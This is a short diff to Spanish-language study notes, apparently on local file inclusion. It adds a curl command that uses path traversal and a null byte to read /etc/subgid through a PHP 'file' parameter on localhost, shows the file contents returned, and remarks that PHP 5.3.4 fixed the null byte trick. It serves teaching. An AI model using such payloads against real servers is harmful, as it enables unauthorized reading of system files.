@@ -2186,9 +2186,12 @@ http://localhost/index.php?file=contact
 
 Petición malintencionada:
 
-```python
-
+```bash
+curl --silent "http://localhost/index.php?file=../../../../../../../../../etc/subgid%00"
+s4vitar:100000:65536
 ```
+
+Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la versión **5.3.4**.
 
 
 
